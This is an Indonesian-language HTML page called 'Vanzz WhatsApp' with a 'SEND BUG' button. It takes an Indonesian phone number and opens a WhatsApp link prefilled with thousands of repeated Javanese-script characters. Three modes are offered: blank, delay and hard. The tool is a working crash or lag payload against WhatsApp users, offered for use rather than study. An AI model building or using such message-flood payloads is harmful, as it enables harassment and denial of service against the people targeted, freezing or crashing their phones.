<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vanzz WhatsApp</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
body{
  background:linear-gradient(135deg,#0f0f0f,#1a1a1a);
  color:white;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}
.container{
  width:90%;
  max-width:400px;
  background:#111;
  padding:25px;
  border-radius:20px;
  border:2px solid #7b2ff7;
  box-shadow:0 0 25px rgba(123,47,247,0.4);
  text-align:center;
}
.profile{
  width:120px;
  height:120px;
  border-radius:15px;
  border:3px solid #7b2ff7;
  object-fit:cover;
  margin-bottom:15px;
}
.title{
  font-size:28px;
  font-weight:700;
  letter-spacing:3px;
  margin-bottom:20px;
}
input, select{
  width:100%;
  padding:12px;
  border-radius:30px;
  border:2px solid #7b2ff7;
  background:#0f0f0f;
  color:white;
  outline:none;
  margin-top:10px;
}
button{
  width:100%;
  padding:14px;
  border-radius:30px;
  border:none;
  background:linear-gradient(90deg,#7b2ff7,#f107a3);
  color:white;
  font-weight:600;
  font-size:16px;
  cursor:pointer;
  margin-top:20px;
}
.loader{
  margin-top:15px;
  font-size:13px;
  max-height:60px;
  overflow:auto;
  opacity:0.7;
  word-wrap:break-word;
}
</style>
</head>
<body>

<div class="container">

  <img src="https://files.catbox.moe/0ou2vs.png" class="profile">

  <div class="title">VANZZ</div>

  <input type="text" id="number" placeholder="628xxxxxxxxxx">

  <select id="type">
    <option value="blank">Blank</option>
    <option value="delay">Delay</option>
    <option value="hard">Hard</option>
  </select>

  <button onclick="openWA()">SEND BUG</button>

  <div class="loader" id="loader"></div>

</div>

<script>
function openWA(){
  let number = document.getElementById("number").value.trim();
  let type = document.getElementById("type").value;

  if(!number.startsWith("62")){
    alert("Gunakan format 62xxxx tanpa +");
    return;
  }

  let text = "";

  if(type === "blank"){
    text = "ꦾ".repeat(10000);
  } 
  else if(type === "delay"){
    text = "Halo dari Vanzz\n\n" + "ꦾ".repeat(1000);
  } 
  else if(type === "hard"){
    text = "Pesan penting dari Vanzz\n\n" + "ꦲꦤꦕꦫꦏ".repeat(200);
  }

  // preview kecil loader
  document.getElementById("loader").innerText = text.slice(0,300);

  let url = "https://wa.me/" + number + "?text=" + encodeURIComponent(text);
  window.open(url, "_blank");
}
</script>

</body>
</html>
